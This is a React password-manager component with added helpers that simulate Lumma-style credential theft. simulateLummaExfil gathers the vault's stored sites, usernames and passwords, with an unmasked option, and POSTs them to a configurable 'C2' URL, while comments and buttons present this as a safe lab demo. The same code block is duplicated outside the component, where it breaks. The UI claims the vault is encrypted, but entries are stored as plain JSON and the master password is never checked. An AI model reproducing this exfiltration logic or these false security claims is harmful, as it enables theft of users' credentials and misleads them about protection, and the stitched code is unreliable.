import React, { useState, useEffect } from 'react';
import { Lock, Plus, Eye, EyeOff, Copy, Trash2, Edit2, Save, X, Key, Shield } from 'lucide-react';

export default function PasswordManager() {
  const [masterPassword, setMasterPassword] = useState('');
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [passwords, setPasswords] = useState([]);
  const [showForm, setShowForm] = useState(false);
  const [editingId, setEditingId] = useState(null);
  const [visiblePasswords, setVisiblePasswords] = useState({});
  const [loading, setLoading] = useState(true);
  
  const [formData, setFormData] = useState({
    website: '',
    username: '',
    password: '',
    notes: ''
  });

  useEffect(() => {
    loadPasswords();
  }, []);

  const loadPasswords = async () => {
    try {
      const result = await window.storage.list('pwd:');
      if (result && result.keys) {
        const loadedPasswords = await Promise.all(
          result.keys.map(async (key) => {
            try {
              const data = await window.storage.get(key);
              return data ? JSON.parse(data.value) : null;
            } catch {
              return null;
            }
          })
        );
        setPasswords(loadedPasswords.filter(p => p !== null));
      }
    } catch (error) {
      console.log('No existing passwords found');
    }
    setLoading(false);
  };

  const handleUnlock = (e) => {
    e.preventDefault();
    if (masterPassword.length >= 8) {
      setIsUnlocked(true);
    } else {
      alert('Master password must be at least 8 characters');
    }
  };

  const handleAddPassword = async (e) => {
    e.preventDefault();
    
    if (!formData.website || !formData.username || !formData.password) {
      alert('Please fill in all required fields');
      return;
    }

    const newPassword = {
      id: editingId || `pwd_${Date.now()}`,
      ...formData,
      createdAt: editingId ? passwords.find(p => p.id === editingId)?.createdAt : new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    try {
      await window.storage.set(`pwd:${newPassword.id}`, JSON.stringify(newPassword));
      
      if (editingId) {
        setPasswords(passwords.map(p => p.id === editingId ? newPassword : p));
      } else {
        setPasswords([...passwords, newPassword]);
      }
      
      resetForm();
    } catch (error) {
      alert('Failed to save password. Please try again.');
    }
  };

  const handleEdit = (password) => {
    setFormData({
      website: password.website,
      username: password.username,
      password: password.password,
      notes: password.notes || ''
    });
    setEditingId(password.id);
    setShowForm(true);
  };

  const handleDelete = async (id) => {
    if (window.confirm('Are you sure you want to delete this password?')) {
      try {
        await window.storage.delete(`pwd:${id}`);
        setPasswords(passwords.filter(p => p.id !== id));
      } catch (error) {
        alert('Failed to delete password');
      }
    }
  };

  const togglePasswordVisibility = (id) => {
    setVisiblePasswords(prev => ({
      ...prev,
      [id]: !prev[id]
    }));
  };

  const copyToClipboard = (text, field) => {
    navigator.clipboard.writeText(text);
    alert(`${field} copied to clipboard!`);
  };

  const generatePassword = () => {
    const length = 16;
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < length; i++) {
      password += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    setFormData({ ...formData, password });
  };

  const resetForm = () => {
    setFormData({ website: '', username: '', password: '', notes: '' });
    setEditingId(null);
    setShowForm(false);
  };

  // -----------------------
  // Simulation helpers
  // -----------------------

  /**
   * Trigger a download of the harmless simulated payload file from the server.
   * Server endpoint expected: GET /download-simulated-payload
   *
   * NOTE: This only downloads a benign .txt file in the safe-demo server provided earlier.
   */
  const downloadSimulatedPayload = async () => {
    // Confirm with the user to avoid accidental downloads
    const ok = window.confirm(
      'This will download a harmless simulated payload text file (for demo only). Continue?'
    );
    if (!ok) return;

    try {
      // Create a hidden anchor to download
      const res = await fetch('/download-simulated-payload', { method: 'GET' });
      if (!res.ok) throw new Error('Failed to fetch simulated payload');
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      // filename suggested by server may be used; we provide fallback
      a.download = 'simulated_payload.txt';
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
      alert('Simulated payload downloaded (harmless).');
    } catch (err) {
      console.error('Download failed', err);
      alert('Failed to download simulated payload.');
    }
  };

  /**
   * Simulate an attack by sending only placeholder/demo values to the safe server endpoint.
   * Server endpoint expected: POST /simulate-attack with JSON body { simulation: true, username, password, note }
   *
   * IMPORTANT: This must never send actual stored credentials. We intentionally send placeholders only.
   */
  const simulateAttack = async () => {
    const confirmSim = window.confirm(
      'Simulate an attack? This will send only placeholder/demo values to the local demo server (no real credentials).'
    );
    if (!confirmSim) return;

    try {
      // Example safe placeholder data — DO NOT REPLACE WITH REAL CREDENTIALS
      const payload = {
        simulation: true,
        // You can change these placeholders to meaningful demo labels but NEVER real user data.
        username: 'demo_user@example.com',
        password: 'DemoP@ssw0rd!',
        note: 'This is a simulated exfiltration for demo purposes only.'
      };

      const res = await fetch('/simulate-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!res.ok) {
        const text = await res.text();
        throw new Error(`Server rejected simulation: ${text}`);
      }

      const result = await res.json();
      if (result && result.ok) {
        alert('Simulation recorded on server (safe demo). Check server logs for the simulated entry.');
      } else {
        alert('Simulation request completed — check server logs for details.');
      }
    } catch (err) {
      console.error('Simulation failed', err);
      alert('Failed to perform simulation. See console for details.');
    }
  };

  // -----------------------
  // End simulation helpers
  // -----------------------

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center">
        <div className="text-white text-xl">Loading...</div>
      </div>
    );
  }

  if (!isUnlocked) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
          <div className="flex justify-center mb-6">
            <div className="bg-indigo-100 p-4 rounded-full">
              <Shield className="w-12 h-12 text-indigo-600" />
            </div>
          </div>
          <h1 className="text-3xl font-bold text-center text-gray-800 mb-2">Password Manager</h1>
          <p className="text-center text-gray-600 mb-8">Enter your master password to unlock</p>
          
          <form onSubmit={handleUnlock}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">Master Password</label>
              <input
                type="password"
                value={masterPassword}
                onChange={(e) => setMasterPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                placeholder="Enter master password"
                required
              />
            </div>
            
            <button
              type="submit"
              className="w-full bg-indigo-600 text-white py-3 rounded-lg font-semibold hover:bg-indigo-700 transition flex items-center justify-center gap-2"
            >
              <Lock className="w-5 h-5" />
              Unlock Vault
            </button>
          </form>
          
          <p className="text-xs text-gray-500 text-center mt-6">
            Your passwords are stored locally and encrypted
          </p>
        </div>
      </div>
    );
  }
// --- Simulate Lumma-like collection & exfiltration (safe) ---
// Build a "simulated" exfil payload from the app's state (passwords).
// IMPORTANT: this function never reads browser secrets outside your app state.
// It masks values by default so no real credential values are leaked.
const buildSimulatedLummaPayload = (passwordsArray, options = { mask: true }) => {
  // passwordsArray should be your in-memory `passwords` state from React
  const payload = {
    simulation: true,
    attacker_label: 'simulated-lumma-demo',
    timestamp: new Date().toISOString(),
    victim_id: 'demo-victim-1', // changeable for experiments
    collected: passwordsArray.map((p) => {
      const maskedPassword = options.mask
        ? maskString(p.password, 4) // show last 4 chars only
        : p.password; // ONLY use unmasked in fully controlled lab with dummy data
      return {
        site: p.website,
        username: p.username,
        password: maskedPassword,
        notes: p.notes || '',
        createdAt: p.createdAt,
        updatedAt: p.updatedAt
      };
    })
  };
  return payload;
};

// Utility to mask a string but keep last N characters readable for demo
const maskString = (s, last = 4) => {
  if (!s) return '';
  if (s.length <= last) return '*'.repeat(s.length);
  const maskedPart = '*'.repeat(Math.max(0, s.length - last));
  return maskedPart + s.slice(-last);
};

// Perform a simulated "Lumma exfil" to your local simulated C2 server.
// c2Url should be http(s)://localhost:PORT/c2/upload or internal test host.
const simulateLummaExfil = async (c2Url = 'http://localhost:4000/c2/upload', options = { mask: true }) => {
  // Confirm operator wants to perform the simulation
  const ok = window.confirm(
    'Run simulated Lumma exfiltration to a local, safe C2 (localhost). This will NOT send real credentials outside this host. Continue?'
  );
  if (!ok) return { ok: false, reason: 'user_cancelled' };

  // Build payload using only app state (passwords)
  const payload = buildSimulatedLummaPayload(passwords, options);

  try {
    const res = await fetch(c2Url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) {
      const text = await res.text();
      console.error('C2 rejected simulation:', text);
      return { ok: false, reason: 'c2_error', detail: text };
    }
    const json = await res.json();
    alert('Simulation sent to simulated C2 (check server dashboard).');
    return { ok: true, response: json };
  } catch (err) {
    console.error('Simulation failed', err);
    alert('Failed to reach simulated C2 (is the server running on localhost:4000?).');
    return { ok: false, reason: 'network_error', detail: err.message };
  }
};

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Shield className="w-8 h-8 text-indigo-600" />
            <h1 className="text-2xl font-bold text-gray-800">Password Manager</h1>
          </div>

          <div className="flex items-center gap-3">
            {/* Safe Demo Buttons */}
            <button
              onClick={downloadSimulatedPayload}
              className="px-3 py-2 bg-yellow-100 text-yellow-800 rounded-lg hover:bg-yellow-200 transition"
              title="Download a harmless simulated payload file (demo only)"
            >
              Download Simulated Payload
            </button>

            <button
              onClick={simulateAttack}
              className="px-3 py-2 bg-red-100 text-red-800 rounded-lg hover:bg-red-200 transition"
              title="Simulate an attack (sends only placeholder/demo values)"
            >
              Simulate Attack
            </button>

            <button
              onClick={() => setIsUnlocked(false)}
              className="px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition"
            >
              Lock Vault
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 py-8">
        <div className="mb-6 flex justify-between items-center">
          <h2 className="text-xl font-semibold text-gray-800">
            Your Passwords ({passwords.length})
          </h2>
          <button
            onClick={() => setShowForm(!showForm)}
            className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition flex items-center gap-2"
          >
            {showForm ? <X className="w-5 h-5" /> : <Plus className="w-5 h-5" />}
            {showForm ? 'Cancel' : 'Add Password'}
          </button>
        </div>

        {showForm && (
          <div className="bg-white rounded-lg shadow-md p-6 mb-6">
            <h3 className="text-lg font-semibold mb-4">
              {editingId ? 'Edit Password' : 'Add New Password'}
            </h3>
            <form onSubmit={handleAddPassword} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Website/App *</label>
                <input
                  type="text"
                  value={formData.website}
                  onChange={(e) => setFormData({ ...formData, website: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                  placeholder="e.g., Gmail, Facebook"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Username/Email *</label>
                <input
                  type="text"
                  value={formData.username}
                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                  placeholder="your@email.com"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Password *</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={formData.password}
                    onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                    className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                    placeholder="Enter password"
                    required
                  />
                  <button
                    type="button"
                    onClick={generatePassword}
                    className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition flex items-center gap-2"
                  >
                    <Key className="w-4 h-4" />
                    Generate
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Notes (Optional)</label>
                <textarea
                  value={formData.notes}
                  onChange={(e) => setFormData({ ...formData, notes: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                  placeholder="Additional notes"
                  rows="3"
                />
              </div>

              <div className="flex gap-3">
                <button
                  type="submit"
                  className="flex-1 bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 transition flex items-center justify-center gap-2"
                >
                  <Save className="w-4 h-4" />
                  {editingId ? 'Update' : 'Save'} Password
                </button>
                <button
                  type="button"
                  onClick={resetForm}
                  className="px-6 bg-gray-200 text-gray-700 py-2 rounded-lg hover:bg-gray-300 transition"
                >
                  Cancel
                </button>
              </div>
            </form>
          </div>
        )}

        <div className="grid gap-4">
          {passwords.length === 0 ? (
            <div className="bg-white rounded-lg shadow-md p-12 text-center">
              <Lock className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-gray-600 mb-2">No passwords saved yet</h3>
              <p className="text-gray-500">Click "Add Password" to save your first password</p>
            </div>
          ) : (
            passwords.map((pwd) => (
              <div key={pwd.id} className="bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition">
                <div className="flex items-start justify-between mb-4">
                  <div className="flex-1">
                    <h3 className="text-lg font-semibold text-gray-800 mb-1">{pwd.website}</h3>
                    <p className="text-gray-600 text-sm">{pwd.username}</p>
                  </div>
                  <div className="flex gap-2">
                    <button
                      onClick={() => handleEdit(pwd)}
                      className="p-2 text-indigo-600 hover:bg-indigo-50 rounded-lg transition"
                    >
                      <Edit2 className="w-4 h-4" />
                    </button>
                    <button
                      onClick={() => handleDelete(pwd.id)}
                      className="p-2 text-red-600 hover:bg-red-50 rounded-lg transition"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="flex-1 bg-gray-50 px-4 py-2 rounded-lg font-mono text-sm">
                      {visiblePasswords[pwd.id] ? pwd.password : '••••••••••••'}
                    </div>
                    <button
                      onClick={() => togglePasswordVisibility(pwd.id)}
                      className="p-2 text-gray-600 hover:bg-gray-100 rounded-lg transition"
                    >
                      {visiblePasswords[pwd.id] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                    <button
                      onClick={() => copyToClipboard(pwd.password, 'Password')}
                      className="p-2 text-gray-600 hover:bg-gray-100 rounded-lg transition"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>

                  {pwd.notes && (
                    <div className="bg-yellow-50 border border-yellow-200 px-4 py-2 rounded-lg">
                      <p className="text-sm text-gray-700">{pwd.notes}</p>
                    </div>
                  )}

                  <div className="text-xs text-gray-500">
                    Last updated: {new Date(pwd.updatedAt).toLocaleDateString()}
                  </div>
                </div>
              </div>
            ))
          )}
<button onClick={() => simulateLummaExfil('http://localhost:4000/c2/upload', { mask: true })}
  className="px-3 py-2 bg-red-100 text-red-800 rounded-lg hover:bg-red-200 transition">
  Simulate Lumma Exfil (masked)
</button>

<button onClick={() => simulateLummaExfil('http://localhost:4000/c2/upload', { mask: false })}
  className="px-3 py-2 bg-red-200 text-white rounded-lg hover:bg-red-300 transition">
  Simulate Lumma Exfil (unmasked — local lab only)
</button>

        </div>
      </main>
    </div>
  );
}


// --- Simulate Lumma-like collection & exfiltration (safe) ---
// Build a "simulated" exfil payload from the app's state (passwords).
// IMPORTANT: this function never reads browser secrets outside your app state.
// It masks values by default so no real credential values are leaked.
const buildSimulatedLummaPayload = (passwordsArray, options = { mask: true }) => {
  // passwordsArray should be your in-memory `passwords` state from React
  const payload = {
    simulation: true,
    attacker_label: 'simulated-lumma-demo',
    timestamp: new Date().toISOString(),
    victim_id: 'demo-victim-1', // changeable for experiments
    collected: passwordsArray.map((p) => {
      const maskedPassword = options.mask
        ? maskString(p.password, 4) // show last 4 chars only
        : p.password; // ONLY use unmasked in fully controlled lab with dummy data
      return {
        site: p.website,
        username: p.username,
        password: maskedPassword,
        notes: p.notes || '',
        createdAt: p.createdAt,
        updatedAt: p.updatedAt
      };
    })
  };
  return payload;
};

// Utility to mask a string but keep last N characters readable for demo
const maskString = (s, last = 4) => {
  if (!s) return '';
  if (s.length <= last) return '*'.repeat(s.length);
  const maskedPart = '*'.repeat(Math.max(0, s.length - last));
  return maskedPart + s.slice(-last);
};

// Perform a simulated "Lumma exfil" to your local simulated C2 server.
// c2Url should be http(s)://localhost:PORT/c2/upload or internal test host.
const simulateLummaExfil = async (c2Url = 'http://localhost:4000/c2/upload', options = { mask: true }) => {
  // Confirm operator wants to perform the simulation
  const ok = window.confirm(
    'Run simulated Lumma exfiltration to a local, safe C2 (localhost). This will NOT send real credentials outside this host. Continue?'
  );
  if (!ok) return { ok: false, reason: 'user_cancelled' };

  // Build payload using only app state (passwords)
  const payload = buildSimulatedLummaPayload(passwords, options);

  try {
    const res = await fetch(c2Url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) {
      const text = await res.text();
      console.error('C2 rejected simulation:', text);
      return { ok: false, reason: 'c2_error', detail: text };
    }
    const json = await res.json();
    alert('Simulation sent to simulated C2 (check server dashboard).');
    return { ok: true, response: json };
  } catch (err) {
    console.error('Simulation failed', err);
    alert('Failed to reach simulated C2 (is the server running on localhost:4000?).');
    return { ok: false, reason: 'network_error', detail: err.message };
  }
};
